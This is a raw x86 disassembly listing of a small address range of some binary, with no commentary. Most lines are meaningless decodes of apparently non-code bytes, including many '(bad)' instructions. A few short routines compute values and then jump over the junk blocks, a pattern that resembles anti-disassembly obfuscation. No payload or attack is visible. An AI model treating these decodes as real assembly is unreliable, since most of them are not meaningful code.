  40c4d9:	fild   QWORD PTR [ebp+0x46]
  40c4dc:	(bad)  
  40c4dd:	sub    eax,0xd213ec10
  40c4e2:	sbb    dl,BYTE PTR [eax-0x1]
  40c4e5:	mov    eax,0xa156520d
  40c4ea:	add    BYTE PTR [ecx],al
  40c4ec:	xchg   esi,eax
  40c4ed:	pop    ds
  40c4ee:	aam    0x7b
  40c4f0:	or     al,0x3f
  40c4f2:	dec    BYTE PTR [edx+0x4754a0a9]
  40c4f8:	rol    BYTE PTR [ebp+0x566cc247],cl
  40c4fe:	ja     0x40c488
  40c500:	dec    ebx
  40c501:	popf   
  40c502:	pop    ebx
  40c503:	xor    al,0x7c
  40c505:	rol    BYTE PTR [esi-0x1dc4217b],1
  40c50b:	mov    eax,0xb0293432
  40c510:	cld    
  40c511:	push   ebp
  40c512:	jmp    0x40c49d
  40c514:	iret   
  40c515:	or     cl,BYTE PTR [ecx+0x75]
  40c518:	sbb    al,0xa6
  40c51a:	mov    ds,ebp
  40c51c:	fild   QWORD PTR [eax-0x64]
  40c51f:	(bad)  
  40c521:	mov    al,ds:0x87cc3466
  40c526:	dec    edi
  40c527:	mov    BYTE PTR [ebx],dl
  40c529:	mov    bl,0xd9
  40c52b:	and    al,0x70
  40c52d:	stc    
  40c52e:	mov    DWORD PTR [ebx+0x52],esp
  40c531:	dec    esi
  40c532:	fiadd  WORD PTR [ecx+0x74]
  40c535:	in     eax,0x21
  40c537:	fwait
  40c538:	mov    ds:0x666a6e1e,eax
  40c53d:	ss popf 
  40c53f:	clc    
  40c540:	mov    DWORD PTR [eax-0x62a5743d],0x3a229e45
  40c54a:	hlt    
  40c54b:	hlt    
  40c54c:	add    ebx,DWORD PTR [ecx-0x923b72a]
  40c552:	cmc    
  40c553:	dec    eax
  40c554:	pop    ebx
  40c555:	xor    al,0x4
  40c557:	xor    esi,edi
  40c559:	jmp    0xa2d1:0xda5c1190
  40c560:	clc    
  40c561:	loop   0x40c59e
  40c563:	push   0x3506b76a
  40c568:	xchg   esi,esp
  40c56a:	mov    eax,DWORD PTR [ebp-0x3b0210c0]
  40c570:	and    DWORD PTR [edi],ebp
  40c572:	int3   
  40c573:	cwde   
  40c574:	jl     0x40c4f9
  40c576:	xchg   ebp,eax
  40c577:	fdivr  QWORD PTR [ecx+0x4c]
  40c57a:	xor    eax,0xe72af4a2
  40c57f:	dec    edx
  40c580:	pop    esi
  40c581:	aam    0xe9
  40c583:	sahf   
  40c584:	lods   al,BYTE PTR ds:[esi]
  40c585:	xor    ah,0x8a
  40c588:	mov    esi,0x25e97455
  40c58d:	mov    eax,eax
  40c58f:	xchg   ebp,eax
  40c590:	in     al,0x7d
  40c592:	lahf   
  40c593:	in     eax,dx
  40c594:	push   0x5592fe60
  40c599:	jbe    0x40c5fd
  40c59b:	jge    0x40c57b
  40c59d:	sbb    ch,BYTE PTR [esi]
  40c59f:	in     al,0x2d
  40c5a1:	int3   
  40c5a2:	or     edx,esi
  40c5a4:	aas    
  40c5a5:	add    BYTE PTR [eax],0x15
  40c5a8:	retf   
  40c5a9:	lods   al,BYTE PTR ds:[esi]
  40c5aa:	loopne 0x40c598
  40c5ac:	int    0x1a
  40c5ae:	and    DWORD PTR [esi],ebp
  40c5b0:	je     0x40c5e0
  40c5b2:	push   edi
  40c5b3:	test   BYTE PTR [edi-0x12eb6da3],al
  40c5b9:	loopne 0x40c5c9
  40c5bb:	ror    esp,cl
  40c5bd:	scas   al,BYTE PTR es:[edi]
  40c5be:	push   es
  40c5bf:	mov    bl,0x8a
  40c5c1:	or     DWORD PTR [edi+0x607231cd],ebp
  40c5c7:	and    DWORD PTR [ebp-0xf2e530],0x7c05d8b9
  40c5d1:	mov    bh,0xb8
  40c5d3:	and    ecx,DWORD PTR [eax-0x28d99f2a]
  40c5d9:	or     cl,BYTE PTR [ebp+0x71]
  40c5dc:	in     eax,dx
  40c5dd:	stc    
  40c5de:	adc    dh,BYTE PTR [esi-0x7cc160c]
  40c5e4:	inc    ebx
  40c5e5:	and    BYTE PTR ds:0x1a4c1a09,ch
  40c5eb:	fwait
  40c5ec:	dec    eax
  40c5ed:	lods   eax,DWORD PTR ds:[esi]
  40c5ee:	cwde   
  40c5ef:	inc    edx
  40c5f0:	icebp  
  40c5f1:	xor    DWORD PTR [edx],ecx
  40c5f3:	lea    ecx,[esi+0xa]
  40c5f6:	clc    
  40c5f7:	adc    BYTE PTR [ecx],bl
  40c5f9:	rcr    BYTE PTR [esi],cl
  40c5fb:	call   0xaf65fcc4
  40c600:	out    dx,al
  40c601:	cmp    edi,DWORD PTR [edi]
  40c603:	addr16 mov bl,0x43
  40c606:	jne    0x40c645
  40c608:	xor    al,BYTE PTR [ebx-0x2b0e667b]
  40c60e:	push   ebp
  40c60f:	enter  0x2238,0xdb
  40c613:	data16 loope 0x40c604
  40c616:	push   ecx
  40c617:	sbb    al,0x43
  40c619:	sub    dl,bh
  40c61b:	(bad)  
  40c61c:	mov    dl,0x5b
  40c61e:	push   edx
  40c61f:	sbb    ebp,esi
  40c621:	and    DWORD PTR [edi-0x80],ebx
  40c624:	sbb    BYTE PTR [ebx-0x2e],0x24
  40c628:	imul   ebp,DWORD PTR [ebx-0x184beb3e],0xdf45bf8a
  40c632:	(bad)  
  40c633:	and    ebp,esi
  40c635:	stos   DWORD PTR es:[edi],eax
  40c636:	outs   dx,DWORD PTR ds:[esi]
  40c637:	repz push ebp
  40c639:	mov    ds:0x6be7478e,al
  40c63e:	or     ecx,DWORD PTR [ebx+eax*2-0x80]
  40c642:	jle    0x40c5c7
  40c644:	(bad)  
  40c645:	(bad)  [edi+0x308b6ff3]
  40c64b:	outs   dx,BYTE PTR ds:[esi]
  40c64c:	jge    0x40c67e
  40c64e:	jmp    0x7976:0xefefe175
  40c655:	mov    esp,0x1589881f
  40c65a:	aad    0x51
  40c65c:	or     eax,0x4f68b952
  40c661:	iret   
  40c662:	or     eax,0x3547642b
  40c667:	int    0xd9
  40c669:	push   es
  40c66a:	mov    esp,DWORD PTR [eax-0x69567e2c]
  40c670:	out    0xa7,eax
  40c672:	and    dh,BYTE PTR [ebp+0x3ad11f74]
  40c678:	mov    cl,0xf1
  40c67a:	ja     0x40c612
  40c67c:	clc    
  40c67d:	pop    esp
  40c67e:	add    DWORD PTR [eax+0x77b77535],edx
  40c684:	fucomi st,st(6)
  40c686:	cmc    
  40c687:	test   al,0x0
  40c689:	mov    ecx,0x5b25af8
  40c68e:	(bad)  
  40c68f:	int    0xce
  40c691:	cmp    esp,edi
  40c693:	pop    edi
  40c694:	cmp    bh,BYTE PTR [ebx+0x28684408]
  40c69a:	sub    bh,BYTE PTR [ebp+0x28]
  40c69d:	popf   
  40c69e:	lea    eax,[eax-0x76]
  40c6a1:	sti    
  40c6a2:	pop    edx
  40c6a3:	(bad)  
  40c6a4:	lods   eax,DWORD PTR ds:[esi]
  40c6a5:	leave  
  40c6a6:	lock push es
  40c6a8:	adc    al,0xaf
  40c6aa:	jmp    0x2813f880
  40c6af:	sbb    al,0x6a
  40c6b1:	mov    eax,ds:0x8b8fdbee
  40c6b6:	out    0xcd,eax
  40c6b8:	mov    eax,0x4673cfe9
  40c6bd:	loopne 0x40c6c5
  40c6bf:	mov    BYTE PTR [edi+0xc],bh
  40c6c2:	sbb    ebx,ecx
  40c6c4:	xchg   edx,eax
  40c6c5:	(bad)  
  40c6c6:	mov    esi,0x3f43330f
  40c6cb:	dec    ecx
  40c6cc:	rcl    BYTE PTR [ecx],1
  40c6ce:	jmp    0xd7d5:0x2da873c8
  40c6d5:	mov    cl,0x3c
  40c6d7:	push   ebp
  40c6d8:	imul   esp,DWORD PTR [edx+0x79907a50],0x72
  40c6df:	loop   0x40c691
  40c6e1:	sahf   
  40c6e2:	mov    dh,0xaf
  40c6e4:	mov    dh,0xa5
  40c6e6:	int    0xc3
  40c6e8:	les    esp,FWORD PTR [edx+ecx*1-0x6]
  40c6ec:	(bad)  
  40c6ed:	sti    
  40c6ee:	in     al,dx
  40c6ef:	adc    DWORD PTR [ecx-0xbc0a81e],ebx
  40c6f5:	jns    0x40c76a
  40c6f7:	mov    dl,0xc6
  40c6f9:	sbb    DWORD PTR [eax+ebp*2-0x13],0x41
  40c6fe:	mov    bh,0xa7
  40c700:	lea    eax,[ebx-0x72]
  40c703:	and    BYTE PTR [eax-0x28d33898],dl
  40c709:	repnz mov bl,0x30
  40c70c:	push   eax
  40c70d:	shl    DWORD PTR [ecx-0x72],0x35
  40c711:	addr16 inc esi
  40c713:	pop    ebx
  40c714:	sbb    ebx,DWORD PTR [ecx]
  40c716:	div    DWORD PTR [esi+0x71]
  40c719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c71a:	sbb    eax,0xb5b5e0ef
  40c71f:	sub    ch,BYTE PTR [ecx-0x62]
  40c722:	jmp    0x6fe3d3fb
  40c727:	loop   0x40c6e0
  40c729:	cs push esi
  40c72b:	outs   dx,BYTE PTR ds:[esi]
  40c72c:	mov    ds:0x9ca1de76,eax
  40c731:	fdivr  QWORD PTR cs:0x626a57d9
  40c738:	sub    ebp,DWORD PTR [esp+edi*1-0x4176d709]
  40c73f:	mov    esi,0x8745e6e9
  40c744:	aad    0x17
  40c746:	xor    DWORD PTR [ebp-0x5a],ecx
  40c749:	add    DWORD PTR [ebx-0x5c1e9025],esp
  40c74f:	pop    esp
  40c750:	mov    eax,0xfc8703b8
  40c755:	pop    esi
  40c756:	inc    eax
  40c757:	xchg   edi,eax
  40c758:	fs push cs
  40c75a:	div    DWORD PTR [ebp-0x3d]
  40c75d:	add    cl,BYTE PTR [eax+edi*8-0xf]
  40c761:	xchg   BYTE PTR [edx-0x14],ah
  40c764:	fistp  DWORD PTR [edx+edx*1-0x2b]
  40c768:	jmp    0xf3c7dbf0
  40c76d:	(bad)  
  40c76e:	mov    ?,edi
  40c770:	mov    al,ds:0xeaa34454
  40c775:	jp     0x40c72d
  40c777:	dec    ebx
  40c778:	ja     0x40c7c7
  40c77a:	jno    0x40c734
  40c77c:	fldenv [esp+ecx*8+0x0]
  40c780:	in     al,0x50
  40c782:	and    eax,0xc73c63cf
  40c787:	dec    ebx
  40c788:	jp     0x40c792
  40c78a:	push   cs
  40c78b:	xor    al,0xe2
  40c78d:	pop    edi
  40c78e:	or     DWORD PTR [edi-0x42005aed],eax
  40c794:	or     DWORD PTR [edx+edx*8-0x48],ebp
  40c798:	add    al,0xcd
  40c79a:	mov    ah,0xdb
  40c79c:	push   eax
  40c79d:	sbb    bh,0x8b
  40c7a0:	and    eax,0x8eb0f184
  40c7a5:	lea    ecx,[eax-0x4a]
  40c7a8:	xor    eax,0x38846645
  40c7ad:	adc    al,0xbe
  40c7af:	(bad)
  40c7b2:	mov    DWORD PTR [ebx],edi
  40c7b4:	lock xor al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x61adfb70]
  40c7fd:	jo     0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    bh,dh
  40c807:	xchg   ecx,eax
  40c808:	sub    eax,0x51f93b2e
  40c80d:	sub    cl,ch
  40c80f:	adc    eax,0xc233fddc
  40c814:	mov    dh,0xa9
  40c816:	jge    0x40c7f0
  40c818:	repnz stos BYTE PTR es:[edi],al
  40c81a:	(bad)  
  40c81b:	xchg   edi,eax
  40c81c:	xchg   esp,eax
  40c81d:	ss push esi
  40c81f:	ficomp WORD PTR [edx]
  40c821:	jg     0x40c870
  40c823:	jbe    0x40c822
  40c825:	push   ebp
  40c826:	rol    BYTE PTR [esi],1
  40c828:	xchg   ecx,eax
  40c829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c82a:	rcr    BYTE PTR [edx],0x8d
  40c82d:	or     eax,0x7c801374
  40c832:	sub    dh,BYTE PTR [esi+esi*1+0x60b0ffb6]
  40c839:	mov    ds:0xee552bbc,al
  40c83e:	call   0x6c2d1015
  40c843:	mov    WORD PTR [ebx],ds
  40c845:	data16 jo 0x40c863
  40c848:	outs   dx,DWORD PTR ds:[esi]
  40c849:	aaa    
  40c84a:	mov    bl,0xfb
  40c84c:	xchg   edi,eax
  40c84d:	mov    ecx,0xcdb323df
  40c852:	pop    ss
  40c853:	dec    ebx
  40c854:	mov    ah,0x76
  40c856:	add    ebx,DWORD PTR [ebp-0x5a]
  40c859:	jbe    0x40c8c8
  40c85b:	shl    BYTE PTR [edx-0x12],0x24
  40c85f:	xchg   esp,eax
  40c860:	arpl   bp,si
  40c862:	sub    BYTE PTR [edx],0xce
  40c865:	mov    ch,0xb3
  40c867:	inc    DWORD PTR [ebx]
  40c869:	aas    
  40c86a:	out    0x88,al
  40c86c:	dec    esp
  40c86d:	pop    eax
  40c86e:	fidivr DWORD PTR [esi]
  40c870:	mov    ah,0xf2
  40c872:	icebp  
  40c873:	jo     0x40c802
  40c875:	mov    edx,edx
  40c877:	xchg   ebp,eax
  40c878:	rcl    DWORD PTR [ebx+0x6a],cl
  40c87b:	push   ss
  40c87c:	or     BYTE PTR [ecx+0x45f93ab1],bl
  40c882:	stos   DWORD PTR es:[edi],eax
  40c883:	mov    BYTE PTR [eax-0x3e],bh
  40c886:	lock push 0x6f
  40c889:	shr    BYTE PTR ds:0x20803a7,0xd2
  40c890:	icebp  
  40c891:	rcl    ch,cl
  40c893:	shl    ecx,0xa6
  40c896:	fwait
  40c897:	aad    0x33
  40c899:	add    BYTE PTR [esi],0x2
  40c89c:	aam    0xa1
  40c89e:	shr    DWORD PTR ds:0x4aaeabf0,0x1b
  40c8a5:	dec    esi
  40c8a6:	xor    cl,BYTE PTR [ebx+eiz*8-0x31]
  40c8aa:	(bad)  
  40c8ab:	push   ebp
  40c8ac:	inc    ebp
  40c8ad:	jp     0x40c92d
  40c8af:	aas    
  40c8b0:	jg     0x40c881
  40c8b2:	jne    0x40c932
  40c8b4:	es stos DWORD PTR es:[edi],eax
  40c8b6:	imul   edx,DWORD PTR [edi+eiz*2-0xa3a696f],0x738c589f
  40c8c1:	add    BYTE PTR [ebx+0x42],ch
  40c8c4:	leave  
  40c8c5:	push   ecx
  40c8c6:	cmp    ebp,DWORD PTR [esi]
  40c8c8:	adc    eax,0x1c52869c
  40c8cd:	jmp    0xa7c390d6
  40c8d2:	jbe    0x40c890
  40c8d4:	leave  
  40c8d5:	jmp    esp
  40c8d7:	add    DWORD PTR [esi-0x11],ebp
  40c8da:	outs   dx,DWORD PTR ds:[esi]
  40c8db:	in     eax,dx
  40c8dc:	add    eax,0xa64e6ddd
  40c8e1:	xchg   edx,esi
  40c8e3:	stos   DWORD PTR es:[edi],eax
  40c8e4:	adc    eax,0xe9d63415
  40c8e9:	paddusb mm2,QWORD PTR [edi]
  40c8ec:	jbe    0x40c96b
  40c8ee:	and    BYTE PTR [eax],cl
  40c8f0:	pop    esi
  40c8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f2:	sub    BYTE PTR [edx-0x75298498],0x29
  40c8f9:	adc    ebp,esi
  40c8fb:	dec    ebx
  40c8fc:	add    ebx,DWORD PTR [esi-0x35b86f8f]
  40c902:	dec    ebp
  40c903:	jo     0x40c8e0
  40c905:	sub    eax,0x6203ce9f
  40c90a:	or     ah,cl
  40c90c:	mov    al,0x6e
  40c90e:	mov    ebp,0xb7583251
  40c913:	pusha  
  40c914:	pop    ds
  40c915:	push   ecx
  40c916:	adc    edx,esi
  40c918:	data16 int 0x6a
  40c91b:	mov    dl,0xdc
  40c91d:	dec    ebx
  40c91e:	rol    DWORD PTR [edi+0x1b1b2910],0x93
  40c925:	push   ebp
  40c926:	ret    0x9f60
  40c929:	std    
  40c92a:	inc    ebx
  40c92b:	mov    ch,0xc1
  40c92d:	sub    ah,BYTE PTR [ebx-0x36495603]
  40c933:	out    dx,eax
  40c934:	aad    0x26
  40c936:	cmc    
  40c937:	adc    bh,BYTE PTR [edx-0x7b]
  40c93a:	inc    edx
  40c93b:	cmp    eax,0xe5b4c4cb
  40c940:	push   ds
  40c941:	ja     0x40c9b9
  40c943:	into   
  40c944:	xchg   ebx,eax
  40c945:	xor    BYTE PTR [eax+edi*2+0x3370f356],0xd6
  40c94d:	out    dx,al
  40c94e:	xor    al,dl
  40c950:	sub    edi,DWORD PTR [ecx]
  40c952:	sbb    DWORD PTR [edi-0x26],ebx
  40c955:	mov    eax,0x2844967e
  40c95a:	pushf  
  40c95b:	add    al,0x31
  40c95d:	jo     0x40c9d6
  40c95f:	xchg   ebp,eax
  40c960:	popa   
  40c961:	dec    ebx
  40c962:	mov    DWORD PTR [eax],edi
  40c964:	jo     0x40c8ea
  40c966:	sbb    eax,0x1a88fdb1
  40c96b:	add    BYTE PTR [ecx],ch
  40c96d:	rol    ch,0x6e
  40c970:	push   ds
  40c971:	mov    eax,ds:0x332f26f9
  40c976:	repnz out dx,al
  40c978:	jb     0x40c922
  40c97a:	mov    edx,0x171f6ad0
  40c97f:	cmp    ah,cl
  40c981:	fstp   st(6)
  40c983:	push   es
  40c984:	sub    edi,DWORD PTR fs:[ecx]
  40c987:	mov    al,0xc6
  40c989:	and    al,0x7f
  40c98b:	cmp    al,0xea
  40c98d:	adc    esi,ecx
  40c98f:	mov    eax,ds:0xbfd065f9
  40c994:	shl    BYTE PTR [esi-0x7ee5afa8],1
  40c99a:	inc    edx
  40c99b:	cmp    BYTE PTR [edx+0x1f50597b],bl
  40c9a1:	inc    esi
  40c9a2:	es or  eax,0xfca88033
  40c9a8:	or     ebx,DWORD PTR [esi+0xa1b56a4]
  40c9ae:	pop    ebx
  40c9af:	and    al,BYTE PTR [ebx-0x4b]
  40c9b2:	mov    ebx,0x8f2510f1
  40c9b7:	imul   ebx,DWORD PTR [ebx],0x53fdf7c2
  40c9bd:	outs   dx,BYTE PTR ds:[esi]
  40c9be:	cdq    
  40c9bf:	ret    0xb337
  40c9c2:	in     eax,0xe7
  40c9c4:	pop    ebx
  40c9c5:	and    DWORD PTR [edi+0xce77e9a],edi
  40c9cb:	adc    eax,DWORD PTR [ebx-0x43]
  40c9ce:	jp     0x40c95e
  40c9d0:	retf   
  40c9d1:	popa   
  40c9d2:	xlat   BYTE PTR ds:[ebx]
  40c9d3:	mov    al,0x93
  40c9d5:	xchg   ecx,eax
  40c9d6:	int    0x14
  40c9d8:	jle    0x40c969
  40c9da:	loop   0x40c976
  40c9dc:	enter  0xc0a3,0x68
  40c9e0:	push   ebx
  40c9e1:	or     DWORD PTR [edx-0x4d],ecx
  40c9e4:	daa    
  40c9e5:	gs and ebx,edi
  40c9e8:	xchg   DWORD PTR ds:0x3ae3aa4b,ecx
  40c9ee:	out    0xfc,eax
  40c9f0:	outs   dx,DWORD PTR ds:[esi]
  40c9f1:	inc    ecx
  40c9f2:	sar    DWORD PTR [ebp-0x12903890],0x7b
  40c9f9:	lds    esi,FWORD PTR [edx]
  40c9fb:	or     eax,0x526c8bcf
  40ca00:	int    0x6c
  40ca02:	jno    0x40c9ea
  40ca04:	test   BYTE PTR [ecx],ah
  40ca06:	loopne 0x40c9be
  40ca08:	psubusw mm3,QWORD PTR [ecx+0x4f]
  40ca0c:	add    al,0xad
  40ca0e:	dec    eax
  40ca0f:	xchg   esi,eax
  40ca10:	ficomp DWORD PTR [ecx]
  40ca12:	mov    es,WORD PTR [ebx+0x6b20ad6]
  40ca18:	mov    ebp,0x6a6c13ea
  40ca1d:	xlat   BYTE PTR ds:[ebx]
  40ca1e:	mov    cl,0xd3
  40ca20:	add    BYTE PTR [eiz*1-0x6932ba94],cl
  40ca27:	in     eax,0xc6
  40ca29:	jnp    0x40ca84
  40ca2b:	cdq    
  40ca2c:	push   eax
  40ca2d:	sub    DWORD PTR [ebx-0x40],ebx
  40ca30:	xor    BYTE PTR [eax],0x6
  40ca33:	xor    BYTE PTR [ebx+0x43cf5e9c],dh
  40ca39:	test   ecx,edx
  40ca3b:	mov    cs,WORD PTR [edx]
  40ca3d:	adc    al,0xf7
  40ca3f:	sti    
  40ca40:	xchg   esp,eax
  40ca41:	sub    BYTE PTR [edx],dh
  40ca43:	xor    BYTE PTR [ebx],dl
  40ca45:	or     BYTE PTR [ecx],dl
  40ca47:	ds pop esp
  40ca49:	fwait
  40ca4a:	lods   eax,DWORD PTR ds:[esi]
  40ca4b:	iret   
  40ca4c:	sub    al,0x16
  40ca4e:	and    DWORD PTR [ebx+eax*8-0x3741d001],0x7f
  40ca56:	pop    es
  40ca57:	ja     0x40ca20
  40ca59:	lahf   
  40ca5a:	mov    al,ds:0xf428f6f7
  40ca5f:	addr16 pop esi
  40ca61:	lock das 
  40ca63:	adc    al,0x6
  40ca65:	call   FWORD PTR [eax-0x4de6ecd7]
  40ca6b:	bound  edx,QWORD PTR ds:0x747ffd28
  40ca71:	popa   
  40ca72:	mov    ebx,DWORD PTR [ebx+0x21]
  40ca75:	mov    esp,0x1584d837
  40ca7a:	sbb    ebp,DWORD PTR [ecx]
  40ca7c:	sbb    dl,BYTE PTR [edx+0x4fe98135]
  40ca82:	test   al,0xe9
  40ca84:	fmul   DWORD PTR [edi]
  40ca86:	adc    BYTE PTR [esi-0x6ae52ef6],ch
  40ca8c:	retf   0x8315
  40ca8f:	aam    0x11
  40ca91:	jae    0x40ca73
  40ca93:	inc    ebx
  40ca94:	xchg   ecx,eax
  40ca95:	jb     0x40ca26
  40ca97:	mov    edi,DWORD PTR [ebp+edx*1-0xbc06e81]
  40ca9e:	js     0x40caf6
  40caa0:	ja     0x40cb20
  40caa2:	mov    al,ds:0xf8429316
  40caa7:	popa   
  40caa8:	jo     0x40ca2b
  40caaa:	out    dx,eax
  40caab:	mov    eax,0x2acd6754
  40cab0:	jnp    0x40ca9d
  40cab2:	and    DWORD PTR [esp+edi*8-0x7d69b26c],ebp
  40cab9:	ds xchg ebx,eax
  40cabb:	cmp    eax,0xc09f8f0e
  40cac0:	xchg   ebp,eax
  40cac1:	and    al,0xe0
  40cac3:	mov    edx,0x8a3bf9ac
  40cac8:	outs   dx,BYTE PTR ds:[esi]
  40cac9:	mov    dl,0x75
  40cacb:	sbb    eax,0x72fe1764
  40cad0:	xchg   ebp,eax
  40cad1:	jmp    0xa155:0x3559e6f
  40cad8:	cli    
  40cad9:	pop    ecx
  40cada:	test   al,0xf7
  40cadc:	xchg   eax,edi
  40cade:	retf   
  40cadf:	dec    esp
  40cae0:	test   dl,0x45
  40cae3:	jno    0x40cabe
  40cae5:	mov    cl,0xcf
  40cae7:	jo     0x40ca72
  40cae9:	push   esp
  40caea:	cmp    al,0x3
  40caec:	loopne 0x40cb64
  40caee:	icebp  
  40caef:	sti    
  40caf0:	loopne 0x40cb12
  40caf2:	in     eax,dx
  40caf3:	(bad)  
  40caf4:	js     0x40ca9f
  40caf6:	add    DWORD PTR [edi+0x4e30de87],esi
  40cafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cafd:	mov    ebx,0x445d204f
  40cb02:	ins    DWORD PTR es:[edi],dx
  40cb03:	(bad)  
  40cb04:	das    
  40cb05:	cs jp  0x40cabb
  40cb08:	push   ebx
  40cb09:	in     al,0xff
  40cb0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb0d:	dec    esp
  40cb0e:	jne    0x40cb1e
  40cb10:	imul   edx,DWORD PTR ds:0xcb30ffa1,0xf25ecbc6
  40cb1a:	(bad)  
  40cb1b:	(bad)  [edi+0x34]
  40cb1e:	repz cmc 
  40cb20:	jbe    0x40cacc
  40cb22:	sahf   
  40cb23:	jge    0x40cb1e
  40cb25:	cli    
  40cb26:	xchg   ebp,eax
  40cb27:	mov    bh,0xfd
  40cb29:	retf   
  40cb2a:	jg     0x40cb1c
  40cb2c:	add    eax,0x799b21d8
  40cb31:	mov    bl,0x7
  40cb33:	mov    dl,0x72
  40cb35:	dec    ebx
  40cb36:	pop    esp
  40cb37:	ds pop eax
  40cb39:	push   ds
  40cb3a:	inc    eax
  40cb3b:	pop    edi
  40cb3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb3d:	pop    esp
  40cb3e:	test   BYTE PTR ds:0x6ef465da,bl
  40cb44:	xchg   esi,eax
  40cb45:	cwde   
  40cb46:	cwde   
  40cb47:	mov    DWORD PTR [ebp+0x182c4d00],edx
  40cb4d:	std    
  40cb4e:	inc    esi
  40cb4f:	jl     0x40cb4c
  40cb51:	das    
  40cb52:	inc    ebp
  40cb53:	js     0x40cb94
  40cb55:	lock cmc 
  40cb57:	mov    ch,0xf7
  40cb59:	push   es
  40cb5a:	(bad)  
  40cb5b:	aas    
  40cb5c:	pop    eax
  40cb5d:	push   ebx
  40cb5e:	pusha  
  40cb5f:	pop    ebx
  40cb60:	enter  0x1b8b,0x30
  40cb64:	cmp    al,0xcc
  40cb66:	inc    esi
  40cb67:	mov    al,ds:0xe7dee9fc
  40cb6c:	adc    eax,0x10aff79
  40cb71:	sbb    BYTE PTR [edi+0x38],al
  40cb74:	cmc    
  40cb75:	retf   
  40cb76:	jns    0x40cb8c
  40cb78:	xor    ah,al
  40cb7a:	mov    fs,WORD PTR [ecx]
  40cb7c:	pop    ds
  40cb7d:	push   esi
  40cb7e:	outs   dx,BYTE PTR ds:[esi]
  40cb7f:	jl     0x40cbb5
  40cb81:	cmp    al,0x78
  40cb83:	shl    BYTE PTR [ebp+0x34],0x3a
  40cb87:	call   0x980f98aa
  40cb8c:	jae    0x40cbda
  40cb8e:	add    BYTE PTR [edi-0x7f],0x45
  40cb92:	setp   BYTE PTR [edi-0x6]
  40cb96:	jge    0x40cbc3
  40cb98:	mov    esi,0x22ea7a6c
  40cb9d:	stos   BYTE PTR es:[edi],al
  40cb9e:	popf   
  40cb9f:	sbb    al,0x2
  40cba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cba2:	mov    ds:0x34b29af1,al
  40cba7:	jmp    0xea7d:0x57ffc63d
  40cbae:	lahf   
  40cbaf:	shl    DWORD PTR [eax+0x60],cl
  40cbb2:	fsub   DWORD PTR [esi+0xf]
  40cbb5:	loop   0x40cc1f
  40cbb7:	xchg   esi,eax
  40cbb8:	mov    edi,0x63ef7203
  40cbbd:	dec    ebp
  40cbbe:	in     al,dx
  40cbbf:	and    BYTE PTR [ebx+edi*1+0x386de002],bh
  40cbc6:	jecxz  0x40cbb3
  40cbc8:	and    DWORD PTR [edx+0xb],esp
  40cbcb:	adc    cl,bh
  40cbcd:	cld    
  40cbce:	or     ebp,DWORD PTR [edi]
  40cbd0:	pusha  
  40cbd1:	out    0x2f,eax
  40cbd3:	cmp    eax,0xdbf6d2ac
  40cbd8:	sahf   
  40cbd9:	jecxz  0x40cb8b
  40cbdb:	mov    edx,0xf86f6a8
  40cbe0:	and    DWORD PTR [ecx],0x0
  40cbe3:	add    BYTE PTR [eax],al
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422670,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x43960c7f],0x1818edb9
